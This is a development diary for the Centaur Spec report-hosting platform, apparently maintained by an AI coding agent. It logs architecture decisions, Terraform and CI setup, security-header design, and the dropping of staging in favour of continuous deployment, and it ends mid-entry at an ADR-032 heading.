# Development diary

> Living history of the Centaur Spec build. The **Current state** block at the top is the agent re-orientation summary — read it first when picking up the project. Below it: forward-chronological entries, newest at the bottom.

---

## Current state — 2026-07-06

| Field                  | Value                                                                          |
| ---------------------- | ------------------------------------------------------------------------------ |
| **Phase**              | **Phase 1 shipped + hardened; auth epic complete; MCP server epic complete + live.** The "stop-the-bleeding" tracks are done: #52 pglite adapter test tier (ADR-0046), #53 per-PR preview isolation (ADR-0047), and **#54 real auth (ADR-0048)** — Clerk sign-in, JIT personal-org provisioning, upload attribution, the session-required flip (DEMO_ACTOR removed), and an app-wide default-protect auth gate (#70). **MCP server (ADR-0051, PRs #87–#92 + completers): remote Streamable-HTTP MCP at `mcp.centaurspec.com`, thin client over `/api/v1`; dual auth — `arp_` API keys (own table, ADR-0008) + Clerk OAuth 2.1 (browser login, OAuth-token forward). Verified live on both paths (incl. bulk report management from Claude Desktop).** Earlier Phase-1 milestones live: async scan pipeline (Phase 1.5a, ADR-0045) and the viewer-origin split `view.<domain>/<slug>` (#41, ADR-0038). Sharing/ACL largely shipped (P1 password #100, allowlist #109, private-by-default #127; `get_acl`/`set_acl` API + MCP live) — `org` mode is still a stub and write grants don't exist; the **ownership & shareability epic (ADR-0059/0060/0061)** now covers both plus per-user ownership. Remaining roadmap: **#55** edge hardening, **#65** app-origin CSP vs Clerk, optional #54 surface (org switcher / folder tree / invites — now scoped under ADR-0061). **UI now wears the "Forge & Ember" warm-dark identity (ADR-0058) — design tokens + brand chrome (Centaur logomark, top bar, avatar menu) + inline report rename + the API-keys/MCP settings reskin (PRs #119/#120/#121/#123).** |
| **Repo path**          | `~/PetProjects/ai-report-platform/` (main). Feature work happens in `worktree/<slug>` (ADR-025), cleaned up on merge. |
| **Last commit on main**| `e2986b3` — Merge PR #150 (ownership epic completion — org ACL mode + per-report write grants, ADR-0056 P2 / ADR-0060). |
| **Remote**             | `git@github.com:agranado2k/ai-report-platform.git` (public). |
| **Live infrastructure**| **shared + prod applied — all via the Terraform pipeline on merge (ADR-018), never manually.** Cloudflare zone (DNS-as-code; Clerk custom domain `clerk.centaurspec.com` + `accounts.centaurspec.com` **verified + deployed**), R2 (`tf-state`, `arp-reports-prod`, `arp-reports-ci`; previews namespace within prod via `pr-<N>/`, ADR-0047), Neon **single `main` branch** + per-PR ephemeral branches (ADR-031), Upstash Redis, Vercel `arp-app-prod` (**app.centaurspec.com**, session-gated) + `arp-view-prod` (**view.centaurspec.com**, public viewer) + `arp-mcp-prod` (**mcp.centaurspec.com**, the MCP server — ADR-0051), GitHub repo with ADR-032/0044 protection (**0 required approvals, signed merge commits**). **Clerk:** prod instance (`pk_live`, app.centaurspec.com) **+** staging dev instance (`pk_test`, used by previews — ADR-0048); the `email` session-token claim is set on both; prod Home URL → `https://app.centaurspec.com`. **OAuth app + DCR enabled on the LIVE instance** (for the MCP); **the dev/preview instance still needs the same OAuth app + DCR** (preview OAuth — not blocking prod). |
| **Active worktrees**   | `worktree/adr-editing-epic` (ADR-0062–0067 docs-integration wave, branch `docs/adr-editing-epic`). `worktree/comments` (ADR-0064 comments & annotations slice 1 — full vertical, branch `feat/comments`, not yet merged; rebased onto PR #150). `worktree/editor-mvp` (ADR-0062 in-dashboard editor, branch `feat/editor-mvp`, not yet merged). `worktree/visual-diff` (ADR-0065 §3/§4 version-history UI + visual diff, branch `feat/visual-diff`, not yet merged). `worktree/sharing-completion` merged (PR #150 — org ACL mode + per-report write grants); `docs/report-ownership-adrs` merged (PR #135 + #136 review-fixes follow-up); `worktree/spike-editor-eval` merged (PR #144). |
| **Spec status**        | **rev 9** (2026-06-17 decision reconcile — ADR-031 single Neon branch / no persistent staging, ADR-0044 signed merge commits + 0 approvals, ADR-0048 session-gated app, canonical `view.<domain>/<slug>`). ADR-0035–0048 in `docs/adr/`; **ADR-001–030 still inline in `docs/spec.html`** (extraction deferred — INDEX backlog). `docs/events.md` is the canonical event registry; the `docs:check` conformance gate is green. |

### Open questions / unresolved decisions

- **`/` (dashboard landing) — gated or public?** Currently gated by the app-wide auth gate (anon → `/sign-in`); decide whether to allowlist `/` as a public signed-out landing. One-line change either way.
- **Google social login on prod** — ~~needs custom OAuth credentials~~ **RESOLVED 2026-06-25:** custom Google OAuth credentials wired; Google login works on `app.centaurspec.com`. NB on any re-domain, add the new `clerk.<domain>/v1/oauth_callback` to the Google client or login fails `redirect_uri_mismatch` — see the 2026-06-25 cutover entry.
- License — `README.md` says TBD. Pick before any public launch.
- **Final project name — resolved:** brand **Centaur**, full name **Centaur Spec** (domain centaurspec.com).
- PSL submission — open the PR against `publicsuffix/list` to add `view.centaurspec.com` (2-6 wk SLA; ship without waiting).
- R2 bucket versioning — `TODO` in `modules/r2/main.tf` (cloudflare provider didn't expose versioning as a resource arg; revisit on a provider bump or wrap via the R2 API).
- **Should re-upload to a soft-deleted slug resurrect the report?** `uploadReport`'s reUpload path has no `deletedAt` filter, so it currently does (surfaced by the #128 review). Decide: intended behavior (document it in a code comment) or a bug (add the guard). Related: issue #132 (create-folder accepts a soft-deleted parent).

### Memory pointers for future-me

- **The diary is the orientation document.** Read this `Current state` block at session start.
- **The spec wins** in disputes. When the diary and `docs/spec.html` disagree, the spec is the contract; the diary is the log.
- **All work in worktrees** per ADR-025: `git worktree add worktree/<slug> -b <type>/<slug>` from the project root. Worktrees live under `worktree/` (gitignored). Branch types: `feat` `fix` `refactor` `chore` `docs`.
- **Terraform via `infra/terraform/scripts/tf.sh` only.** The wrapper acquires a Postgres advisory lock on Neon to prevent parallel-apply state corruption.
- **TDD scaffolding will land in Phase 0e** — until then, write tests alongside code by convention rather than by hook enforcement.

### Update protocol

- **Phase milestone reached** → append a new dated entry below.
- **ADR added, decision reversed, or vendor changed** → append a new dated entry; don't edit old entries.
- **Worktree created for a non-trivial feature** → note it in the next entry; remove from the active list when merged.
- **Infrastructure applied (anything beyond `tf.sh init`)** → append an entry with the env, the plan diff size, and a short note on what changed.

---

## Entries

### 2026-05-18 — Spec drafting begins (rev 1)

Initial spec landed with the first 9 ADRs covering the bones of the platform:

- **ADR-001** Stable slug + versioned content (the core value prop — re-upload keeps the URL).
- **ADR-002** Viewer on a separate origin (`view.<domain>`) for XSS / cookie-theft defense.
- **ADR-003** HTTP API as source of truth; MCP server as a thin client.
- **ADR-004** Cloudflare R2 over Vercel Blob / S3 — no egress fees matter when the viewer is read-heavy.
- **ADR-005** Clerk Organizations from day 1 — retrofit-resistant tenancy.
- **ADR-006** Billing-ready, billing-deferred — `plan` enum + `plan_limits_json` from day 1; Stripe later.
- **ADR-007** Zip bundle upload format for multi-file reports.
- **ADR-008** Hashed, prefixed, user-scoped API keys.
- **ADR-009** Folder-inherited write grants for cross-org collaboration — the unusual one; enables Alice's agent to update Acme's reports without joining Acme's org.

User explicitly asked for the cross-org collaboration model and the orgs-from-day-1 tenancy. Decision drivers: B2B target customer, LLM-driven agents acting on behalf of users.

### 2026-05-18 — Remix + security baseline (rev 2)

Framework switched from Next.js to Remix v2 on Vercel (ADR-010) — loaders/actions fit the upload + ACL-gated streaming flow; Web Fetch primitives keep the security code easy to audit. Two Remix apps in the Turborepo: `apps/app` (dashboard + API) and `apps/view` (viewer).

Security pulled forward as a P0 requirement, not a follow-up:

- **ADR-011** Defense-in-depth baseline (edge, transport, app, data, logging, build, secrets, backups — all in v1).
- **ADR-012** Upload content scanning: ClamAV + phishing heuristics + miner detection; three-stage pipeline (sync pre-checks → async scan → result handling); `report_versions.scan_status` gates publishing.
- **ADR-013** Full viewer security-header stack: enforcing CSP + a second CSP with the `sandbox` directive + report-only shadow CSP + COOP/CORP + `Origin-Agent-Cluster` + Permissions-Policy + Cache-Control + Report-To.

### 2026-05-18 — Untrusted-content rendering deep-dive (rev 3)

Threat model grew from 14 → 21 ranked risks. The new ones all flow from one fact: **we serve arbitrary user HTML/JS to other people's browsers.**

Added a six-layer "untrusted-content rendering" defense:
1. Origin isolation (`view.<domain>`).
2. Public Suffix List submission for `view.<domain>` (sibling-subdomain cookie/storage isolation).
3. `__Host-` cookie prefix on every auth cookie (browser-enforced: no `Domain` attribute).
4. Strict CSP + a second CSP with the `sandbox` directive applied to the top-level document.
5. `Origin-Agent-Cluster: ?1` + COOP/CORP — Spectre defense without breaking cross-origin images/fonts (we deliberately don't enable full COEP).
6. Active-content controls: service worker blocked at the edge (the request-header trick — `Service-Worker: script` → 403); SVG rejected at upload; Trusted Types enforced on the dashboard; CSP report-only shadow.

Three new ADRs:
- **ADR-014** Block service-worker registration at the edge (so abusive content can't persist past takedown).
- **ADR-015** Reject SVG (and active-content image formats) at upload.
- **ADR-016** API key scopes (`reports:write`, `reports:read`, `folders:write`, `acl:write`) + anomaly detection (geo, rate spike, repeated failed-auth).

Plus ADR-002 expanded with the PSL submission and `__Host-` cookies; ADR-013 expanded with the full header bundle.

### 2026-05-19 — Product/Engineering split + architecture deep-dive (rev 4)

Spec restructured into **Part I — Product** and **Part II — Engineering** for two distinct audiences.

Product section gained **six user-journey flow diagrams** (signup→upload→share, LLM-via-MCP upload, re-upload-keeps-URL, cross-org collab, sharing modes, abuse takedown) — each shows actor → system messages over time.

Engineering section gained:
- **ADR-017 (later renumbered 020)** Hexagonal architecture (ports & adapters). Domain core in `packages/domain/`; use cases in `packages/application/`; adapters in `packages/adapters/`. No infra imports in the domain. Easy to test, easy to audit.
- **ADR-018 (later renumbered 021)** Event-driven via Postgres transactional outbox. Events emitted atomically with state changes; dispatcher worker polls and fans out. No new infra dependency for v1.
- Three bounded contexts (Publishing · Identity & Access · Trust & Safety) and a per-table database design with an ASCII ER diagram.

### 2026-05-19 — Engineering practices (rev 5)

Six commitments wired into the engineering section, each enforced via a skill, hook, or CI gate (so the practice is structural, not aspirational):

- **ADR-019 (→ 022)** Strict TDD — Red-Green-Refactor with hook-enforced gates, mirrored from `~/HouseNumbers/zora-pantheon`. Stop hook blocks turn completion on failing tests in any affected package.
- **ADR-020 (→ 023)** BDD with Gherkin — one `.feature` per use case, executed with Playwright + `playwright-bdd`.
- **ADR-021 (→ 024)** Functional programming, **no new libraries** — vanilla TypeScript with `readonly`, a 12-line `pipe()`, and a 15-line `Result<T, E>`. Domain layer is pure; side effects live in adapters.
- **ADR-022 (→ 025)** Git worktrees for all in-progress work — codified in `CLAUDE.md`.
- **ADR-023 (→ 026)** Documentation-as-contract pre-push hook — a trigger matrix maps code-area changes to required doc updates; `/docs-check` skill walks it; pre-push blocks if mismatched.
- **ADR-024 (→ 027)** OpenAPI 3.1 source of truth + Bruno collections + Scalar UI for rendered docs. Bruno generated from OpenAPI; pre-push detects drift; CI runs `bru run` against staging.

### 2026-05-20 — Development & delivery (rev 6)

Added a "Development & delivery" section with a **progress tracker** (two tables, status pills) and three new ADRs:

- **ADR-025 (→ 028)** GitHub Flow with protected `main` — PR-only, 1 CODEOWNERS approval, signed commits, linear history, include administrators (owner cannot bypass).
- **ADR-026 (→ 029)** GitHub Actions for CI (on PR) and CD (on merge to main). 9 CI jobs; CD deploys app + view to Vercel prod, applies Terraform, runs migrations, smoke tests.
- **ADR-027 (→ 030)** Dual AI PR review (Claude + Gemini) — advisory only; CODEOWNERS approval still required. Cost guardrail: skip on diffs > 4,000 lines.

Repo target confirmed as `github.com/agranado2k/<repo>` (public).

### 2026-05-20 — Infrastructure-first restructure + Phase 0a ships (rev 7)

Two related changes landed together.

**Spec restructure (rev 7).** Three new ADRs slotted in at the head of the post-016 block; the practices/delivery ADRs (017-027) renumbered to 020-030:

- **ADR-017** Terraform for all long-lived infrastructure. Per-provider modules (`vercel-app`, `neon-project`, `r2`, `cloudflare-zone`, `upstash-redis`, `clerk-app`, `github-repo`, `resend-domain`); envs (`prod` / `staging` / `shared`) compose modules. Click-ops only for the bootstrap R2 bucket and per-provider PATs.
- **ADR-018** Terraform state on Cloudflare R2 with Postgres advisory locking. R2 has no DynamoDB equivalent, so the standard `dynamodb_table` lock isn't available. We reuse the Neon we already pay for: `pg_advisory_lock(hashtext('tf-' || $env))` in a 30-line shell wrapper. The user chose R2 over HCP Terraform Cloud (stay in Cloudflare).
- **ADR-019** Infrastructure-first delivery. Phase 0 split into 0a-0e: accounts + state bootstrap, modules + apply, skeleton apps + CI/CD, **13 infrastructure E2E features green**, engineering practices wired. No feature code until Phase 1.

User confirmed two key per-PR-environment decisions at the same time: **Neon branch + Vercel preview** per PR (industry standard, ~$0/PR, fully isolated DB; R2 + Upstash share staging with prefix isolation).

**Phase 0a executed.** Repo created at `~/PetProjects/ai-report-platform/`, signed seed commit `e60ee59` on `main`:

```
.gitignore
CLAUDE.md
README.md
docs/spec.html        # rev 7 spec, copied in
docs/infra.md         # bootstrap runbook
infra/terraform/backend.tf
infra/terraform/.tfvars.local.example
infra/terraform/scripts/tf.sh         (executable)
infra/terraform/modules/              (empty — Phase 0b)
infra/terraform/envs/{prod,staging,shared}/   (empty — Phase 0b)
apps/ packages/                        (empty — Phase 0c)
tests/e2e/{infrastructure,features}/   (empty — Phase 0d)
docs/adr/                              (empty — Phase 0b)
```

`tf.sh` smoke-tested: arg parse, `.tfvars.local` loading, required-var checks, mktemp backend config, conditional PG advisory lock for state-mutating commands. Not yet exercised against real R2 (no `tf-state` bucket exists yet — that's an operator action per `docs/infra.md`).

Not pushed to GitHub yet — user will push when ready.

### 2026-05-21 — Diary established; autonomous-execution mode

User asked for two things at once: (1) execute multi-step tasks autonomously without per-step approval, and (2) create a "diary" so future agent sessions have memory of what's been done.

Diary established at `docs/diary.md` (this file). Format: a "Current state" block at the top for agent re-orientation, followed by forward-chronological entries. Backfilled with the full history from 2026-05-18 onwards.

`CLAUDE.md` updated with a top-level "At session start" section pointing here.

Working-style preference saved to the global memory system (`feedback_autonomous_execution.md`) so it persists across projects: execute by default, ask only for genuinely irreversible / cross-account / architecturally ambiguous actions.

This entry written directly on `main`. Worktree convention skipped for a diary-only docs change — the convention's payoff is parallel feature work and stash-free in-flight changes; neither applies here. Next substantive change will use a worktree.

No code or infrastructure changed today. Spec unchanged (still rev 7).

### 2026-05-21 — Phase 0b: Terraform modules written & validated

First substantive worktree-driven work. Branch `feat/phase-0b-tf-modules` at `~/PetProjects/phase-0b-tf-modules/`. **24 Terraform files** across 8 modules and 3 env compositions; all validate cleanly with no warnings.

**Modules** (`infra/terraform/modules/`):
- `vercel-app/` — one Vercel project per Remix app; GitHub integration for preview deploys; env vars + custom domain.
- `neon-project/` — one Neon project, prod + staging branches, role + database + endpoint per branch.
- `r2/` — application R2 buckets (per-env). Note: versioning is a TODO — cloudflare/cloudflare v4 doesn't yet expose it as an argument; will need a `null_resource` workaround or wait for v5.
- `cloudflare-zone/` — DNS records + zone settings (HSTS preload, min TLS 1.2, strict SSL, security header). Uses `cloudflare_zone` data source (assumes zone is pre-created).
- `upstash-redis/` — Redis instance per env; outputs rest URL/token/readonly token.
- `clerk-app/` — documentation-only module (Clerk has no usable TF provider yet); key-prefix validation catches "wrong env's key" mistakes at plan time.
- `github-repo/` — repo + branch protection on `main` (v4 GraphQL resource, not v3 REST) + CODEOWNERS as a tracked file + Actions secrets + variables.
- `resend-domain/` — documentation-only module; sanity-checks the DNS records the operator pasted from Resend's dashboard, outputs them shaped for the cloudflare-zone module to materialize.

**Env compositions** (`infra/terraform/envs/`):
- `shared/` — single-instance resources (Neon project, Cloudflare zone, GitHub repo, Resend domain). Outputs consumed by prod + staging via `terraform_remote_state`.
- `staging/` — staging-tier slice: Vercel app + view, R2 staging + CI buckets, Upstash single-zone, Clerk test instance.
- `prod/` — production slice: same shape, multi-zone Upstash, Clerk live keys, single prod R2 bucket.

**Issues caught & fixed during validation** (worth remembering for future module work):
1. `neon_project` `default_endpoint_settings` is a *block*, not an *argument* in this provider version. Dropped it entirely; explicit `neon_endpoint` resources cover the staging compute config.
2. `for_each` over a sensitive map fails because keys would leak in resource addresses. Fix: don't mark the variable sensitive at the map level; use `nonsensitive(var.x)` in the `for_each`. Applied to both `vercel-app/main.tf` and `github-repo/main.tf`.
3. `neon_branch` doesn't expose `connection_uri` — we build it ourselves from `role.name` + `role.password` + `endpoint.host` + `database.name`.
4. Upstash `multizone` argument is deprecated (auto-enabled on paid plans). Kept the variable as a no-op for callers; removed from the resource.
5. `github_branch_protection_v3` (REST) doesn't support `allows_deletions`. Switched to `github_branch_protection` (v4, GraphQL) — the modern resource. Required moving from `repository = name` to `repository_id = node_id` and from `branch = "main"` to `pattern = "main"`.
6. `vulnerability_alerts` on `github_repository` is deprecated. Extracted to a separate `github_repository_vulnerability_alerts` resource.

All three envs end at "Success! The configuration is valid." with no warnings.

**What's NOT done** (i.e. what Phase 0b would still need before exit):
- `terraform apply` against any env. **Blocked** on the operator finishing the Phase 0a manual bootstrap (R2 `tf-state` bucket, bootstrap Neon project, `.tfvars.local` populated, apex domain on Cloudflare).
- R2 bucket versioning workaround (`null_resource` + curl).
- A `pg_advisory_unlock` smoke test to confirm `tf.sh` lock semantics.

**Active worktree:** `feat/phase-0b-tf-modules` at `~/PetProjects/phase-0b-tf-modules/`. Will become a PR once the project has a GitHub remote (still pending).

### 2026-05-22 — Phase 0b: dedicated Terraform GitHub Actions pipeline

Decision moment: the spec's `cd.yml` originally bundled `terraform apply` with the app deploys. Today we separated infra delivery from app delivery into its own workflow. Triggered: user requested "a different pipeline for Terraform commands when anything related to infrastructure changes." Decisions confirmed in chat:

- **Land in the same Phase 0b worktree** — modules + their CI ship as one cohesive PR.
- **Auto-apply on merge to main** (no Environments-gated approval) — PR review + the plan-on-PR diff is the gate; roll back via R2 state versioning + revert PR if needed.
- **PR-comment plan diff** via `dflook/terraform-plan@v2`.

Workflow at `.github/workflows/terraform.yml` (~190 lines):

- **Triggers**: `pull_request` and `push` to `main`, filtered by path (`infra/terraform/**`, `.github/workflows/terraform.yml`).
- **Permissions**: `contents: read`, `pull-requests: write` (for plan comments).
- **PR jobs** (parallel): `plan-shared`, `plan-staging`, `plan-prod`, `fmt-and-validate`. Each plan uses `dflook/terraform-plan@v2` with an inline `backend_config` (key + endpoints injected from secrets); diff is posted as a sticky PR comment per env. fmt-and-validate runs `terraform fmt -check -recursive` and `terraform validate` on each env with `-backend=false` (offline).
- **Main jobs** (sequential): `apply-shared` → `apply-staging` → `apply-prod`. Each calls `infra/terraform/scripts/tf.sh <env> apply -auto-approve`, which acquires the Postgres advisory lock per ADR-018. `concurrency: cancel-in-progress: false` so a running apply is never killed mid-flight. `apt-get install postgresql-client` step adds `psql` for the lock.
- **Secrets passed via job env**: R2 state creds, PG_LOCK_URL, per-provider tokens, env-specific Clerk keys.

**`tf.sh` fix shipped alongside**: made `.tfvars.local` sourcing optional (`if [[ -f ... ]]; then source; fi`) so the wrapper works in CI where there's no `.tfvars.local`. Required-env-var checks still fail loudly with `PG_LOCK_URL not set` if neither file nor env provides credentials — verified by running `env -i bash tf.sh staging plan` and seeing the expected error.

**`docs/infra.md` updated** with:
- A note that CI handles apply once the repo is pushed; the local `tf.sh` commands are the operator escape hatch.
- A table of 15 required GitHub Actions secrets + 6 required variables, with sources and the jobs that consume each.

**What this means architecturally**: the spec's `cd.yml` is now smaller — just Vercel deploys + migrations + smoke tests. Infrastructure delivery is fully decoupled from application delivery, which is the cleaner separation we wanted anyway. The spec's "delivery" ADRs (028 / 029 / 030) still describe the high-level pipeline correctly; a future spec rev should refine ADR-029 to acknowledge the workflow split.

**Branch state**: commit on `feat/phase-0b-tf-modules`; the branch now has two commits (the modules + this workflow). All three envs still `terraform validate` cleanly.

**Still NOT done** (unchanged from yesterday): no `terraform apply` has run; needs operator bootstrap. R2 versioning workaround still pending. PG advisory-lock smoke test still pending.

### 2026-05-22 — Repo pushed to GitHub; username typo fixed

User created the GitHub repo and pushed. Two events worth logging:

**Repo URL settled** — `git@github.com:agranado2k/ai-report-platform.git` (public). The user initially configured `origin` to `ai-html-report`, then asked to re-point to `ai-report-platform` (matches the internal working name; one identity across local + remote + Terraform resources). Old `ai-html-report` repo on GitHub is now orphaned; user can delete via UI when convenient.

**Username typo fix** — I'd been writing `agrando2k` across docs since rev 1 of the spec. The actual GitHub username is `agranado2k` (matches `/Users/agranado/` + `2k`). Caught when the user pushed and the SSH URL revealed the right spelling. Swept across:

- Main branch (commit `9264a27`): `CLAUDE.md` · `docs/diary.md` · `docs/infra.md` · `docs/spec.html`
- Feat/phase-0b branch (this commit): the same docs *plus* the Terraform-only files (`envs/shared/main.tf` CODEOWNERS template + `provider "github" { owner = ... }`; `modules/github-repo/outputs.tf` description; `modules/vercel-app/variables.tf` description; `envs/shared/variables.tf` description).
- All three Terraform envs still validate cleanly after the sed sweep.

**Push state**:
- `main` → pushed first to `ai-html-report` (commit `4f4452f`), then re-pushed to `ai-report-platform` after the URL swap. Now at `9264a27` with the typo fix.
- `feat/phase-0b-tf-modules` → pushed with this commit (typo fix + diary).
- Both visible on GitHub. Branch protection isn't on yet (Terraform-applied in the future Phase 0c work + the first `apply`). PR-from-feat-into-main is ready to open via the GitHub UI.

**Lesson for future-me**: when establishing a project's identity early (username, repo name, package prefix), pull from authoritative sources (`whoami`, the actual GitHub profile URL) rather than inferring from existing project paths. The `agrando2k` typo would have been caught at first read of any of `/Users/agranado/` if I'd looked.

### 2026-05-25 — Worktree convention change + Neon pooler lock issue

Two small but real things landed today, on top of the user's first attempt at `tf.sh staging apply`.

**Worktree layout moved from sibling to child-of-project.** Old convention was `git worktree add ../<slug>` putting the worktree at `~/PetProjects/<slug>/`. The user's preference: keep everything for one project under the project tree. New convention: `git worktree add worktree/<slug>` from the project root, putting worktrees at `~/PetProjects/ai-report-platform/worktree/<slug>/`. `worktree/` added to `.gitignore` on both branches. ADR-025 text in `docs/spec.html`, `CLAUDE.md`, and the diary's memory pointer all updated to match. Moved the active feat worktree with `git worktree move` — no commits lost, no checkouts broken.

**Neon pooler vs session-level advisory locks.** The user tried `tf.sh staging apply` and hit "Lock 'tf-staging' is held by another tf.sh invocation" → 60s timeout → "Failed to acquire lock." Diagnosis: `PG_LOCK_URL` was pointing at Neon's PgBouncer pooler endpoint (transaction-pooling mode). Session-level advisory locks acquired by one psql invocation persist on the warm pooled backend even after the client disconnects, so the next invocation gets `f` from `pg_try_advisory_lock`. Standard PgBouncer-meets-session-state issue. Resolution: switch `PG_LOCK_URL` to Neon's direct (non-pooled) endpoint and release the stale lock via `SELECT pg_advisory_unlock(hashtext('tf-staging'))`.

Also surfaced — and this one I should have caught when I wrote `tf.sh` originally — the script's locking design is broken in a deeper way: the lock is acquired in one psql invocation and the connection closes IMMEDIATELY, so even on a direct endpoint the lock doesn't actually serialize `terraform apply` runs. Two concurrent applies would both succeed. The fix is a backgrounded long-lived psql session that holds the lock across the apply, signaled to release on exit. Filed as a follow-up; doesn't block the user today as long as they're the only one applying.

**Bootstrap walkthrough also delivered** in chat — the explicit `tf.sh shared init → shared import → shared apply → staging → prod` sequence with the GitHub-repo import step (`module.github_repo.github_repository.this`) before `shared apply`, since the repo already exists from yesterday's push.

**Net effect on the branch**: this commit. No infrastructure changes; layout + convention + diary only.

### 2026-06-02 — Continuous deployment to prod; persistent staging dropped

After applying shared, running staging through ~half a dozen real provider-quirk fixes (Neon org_id, Neon retention cap, Neon branch role inheritance, R2 location case, Upstash regional→global, Upstash free-tier limit, GitHub Variables permission), the user called the architectural question: **is persistent staging actually carrying its weight?**

Decision: **no.** Staging is removed. The platform deploys continuously to prod.

What we keep, what we drop:

- **Kept**: per-PR Vercel preview deploys (every PR gets `<sha>.vercel.app` URLs for app + view automatically), per-PR ephemeral Neon branches (CI provisions them via the Neon API; deleted on PR close), prefix-isolated R2 and Upstash for CI's test data (`pr-<N>/` keys + `pr-<N>:` namespaces).
- **Dropped**: persistent staging Vercel projects (`arp-app-staging`, `arp-view-staging`), staging R2 buckets (`arp-reports-staging`, `arp-reports-ci`), staging Upstash database (`arp-staging`), staging Clerk test instance (still exists in Clerk dashboard; Terraform just stops referencing it), the persistent `staging` branch on the Neon project (main = prod), staging DNS records (`staging.app.agranado.com` / `staging.view.agranado.com`), `envs/staging/` Terraform directory, `plan-staging` + `apply-staging` GHA jobs.

The architectural rationale: at solo + LLM-assisted scale, **the safety net staging used to provide is now provided by other layers** — Vercel previews surface UX/visual issues per-PR; ephemeral Neon branches catch migration breakage per-PR; AI review (Claude + Gemini) + human review catch code defects per-PR; and the production blast radius is bounded by the size of any single change. Persistent staging was costing real Upstash/Vercel quota and forcing a manual "promote to prod" decision that, in practice, was always going to be "yes" after CI green + Vercel preview looked right.

This is a deliberate revision of the spec's **ADR-019** (infrastructure-first delivery had shared → staging → prod) and **ADR-026/029** (CD pipeline ran apply-staging before apply-prod). The infrastructure-first principle stands — every PR still runs against real infrastructure, just not a persistent staging slice. The CD pipeline stays "PR → CI green → human + AI review → merge → auto-apply" but the apply chain shortens to `shared → prod`.

**Code changes landed in this commit:**
- Deleted `infra/terraform/envs/staging/` (composition + secrets template; the gitignored secrets.auto.tfvars went with it)
- Simplified `modules/neon-project/main.tf` — removed `neon_branch.staging` and `neon_endpoint.staging`; the project is now single-branch (main). Per-PR ephemeral branches still happen via the Neon API from CI.
- Trimmed `modules/neon-project/outputs.tf` — removed `staging_connection_uri`
- Trimmed `envs/shared/outputs.tf` — removed `neon_staging_connection_uri`
- Trimmed `envs/shared/main.tf` — removed the two staging DNS records from `local.app_view_records`
- Trimmed `.github/workflows/terraform.yml` — removed `plan-staging` and `apply-staging` jobs; updated header comments and the fmt-and-validate loop from `for env in shared staging prod` to `for env in shared prod`. Five jobs total now: plan-shared, plan-prod, apply-shared, apply-prod, fmt-and-validate.

**What this leaves for next apply (operator-side):**
- `tf.sh shared apply` will diff: destroy `neon_branch.staging`, `neon_endpoint.staging`, and the 2 staging DNS records — clean reconciliation between state and the new code. Probably "0 to add, 0 to change, 4 to destroy."
- `tf.sh prod apply` will then succeed for Upstash (slot freed by the staging destroy step + the now-removed staging Neon branch).

Spec/HTML carry the old shared→staging→prod model and will need a follow-up sync (Phase 0c-ish). The diary is the authoritative log for this decision until that sync happens.

### 2026-06-02 — Phase 0b merged · Phase 0c.1 starts: monorepo scaffold + skeleton Remix apps

**Phase 0b merged.** PR #1 (`feat/phase-0b-tf-modules` → `main`) squash-merged at `51b6186`. The merge surfaced a small divergence: local `main` had an unpushed `chore: worktrees live under worktree/` commit (`8e24da7`) whose contents were already inside the squash. Resolved by `git reset --hard origin/main` on both local `main` and the new feat branch. No work lost — the worktree-convention chore is reflected in the squash and in the diary's ADR-025 entries.

**Phase 0c plan (five sub-PRs, kept small to stay merge-ready):**

| # | What | Why this unit |
|---|---|---|
| 0c.1 (this) | Monorepo scaffold (`pnpm-workspace.yaml`, `turbo.json`, root tsconfig) + skeleton `apps/app` + skeleton `apps/view` with `/` and `/health` routes. Both apps are Remix v2 + Vite + `@vercel/remix` Vercel preset. | Unblocks the three Vercel deploy checks that have been failing on every Phase 0b push because Vercel had no `package.json` to detect. |
| 0c.2 | `packages/headers/` shared `secureHeaders()` emitting the full ADR-013 stack + Edge Middleware stubs (rate-limit, `Service-Worker: script` → 403, scan-status precheck). | Lands the security baseline as a single source of truth before any route uses it. |
| 0c.3 | `.github/workflows/ci.yml` (biome + typecheck + vitest + Playwright + Bruno) and `cd.yml` (post-merge prod deploy + smoke). | The required-status-checks list in 0c.5 needs these jobs to exist first. |
| 0c.4 | `claude-review.yml` + `gemini-review.yml` AI PR-review bots (ADR-030). | Independent of 0c.3 once `ANTHROPIC_API_KEY` / `GEMINI_API_KEY` are in repo secrets (both already populated by Terraform). |
| 0c.5 | Re-tighten branch protection: re-enable "Include administrators" and populate `required_status_checks` with the actually-running job names from 0c.3 + 0c.4. Terraform change in `modules/github-repo/`. | Closes the loop: branch protection is now PR-only AND status-checked. |

Each PR is intended to be small enough to review in one sitting and to deploy on its own — no "0c.1 only works once 0c.3 lands" coupling.

**What landed in this commit (0c.1):**

- Root `package.json` (workspaces, scripts via Turbo, pnpm 9, Node ≥20)
- `pnpm-workspace.yaml` (covers `apps/*` and `packages/*`)
- `turbo.json` (build, dev, typecheck, clean tasks; build outputs include `.vercel/output/**`)
- Root `tsconfig.json` — strict, `noUncheckedIndexedAccess`, `verbatimModuleSyntax`, ES2022/ESNext modules
- `apps/app/` — Remix v2 + Vite + Vercel preset; `app/root.tsx`, `app/routes/_index.tsx`, `app/routes/health.tsx` (returns service + checks + timestamp JSON, `cache-control: no-store`)
- `apps/view/` — same shape as `apps/app` on port 3001; placeholder `_index.tsx` calls out viewer-origin role, `health.tsx` same payload shape
- `.gitignore` — added `.vite/` + `**/.cache/` (rest of the Node/Turbo/Vercel patterns were already there from Phase 0b)

**What's deliberately NOT in this commit:**

- No `entry.client.tsx` / `entry.server.tsx` — the Remix Vite plugin auto-generates both. Less code to maintain unless we need to customize.
- No `$slug.$.tsx` viewer route yet — Phase 1 wires the real slug→version→R2 flow; for 0c.1 the `_index.tsx` is enough to prove Vercel deploys.
- No `vercel.json` per app — the existing `modules/vercel-app/` Terraform configured Root Directory per project; trusting that. If Vercel detection fails on this push, we add `vercel.json` in 0c.5 alongside the branch-protection re-tighten.
- No `packages/headers/` — that's 0c.2's whole point.
- No CI workflows — those are 0c.3.
- No Clerk / Neon / R2 / Upstash wiring inside `/health` — the route reports `"not-wired"` for each so it returns 200 and lets the Phase 0d infrastructure tests assert against a known shape. Phase 0c.2/0c.3 wires real checks.

**Open issue carried into next session**: clean up `worktree/phase-0b-tf-modules` (its branch is merged). Command: `git worktree remove worktree/phase-0b-tf-modules && git branch -D feat/phase-0b-tf-modules` from the project root.

### 2026-06-02 — Solo-developer branch-protection mode (0 required approvals) + Vercel Corepack env-var hunt

Two changes appended to PR #2 after the green-build celebration.

**ADR-032 — solo-developer branch-protection mode.**

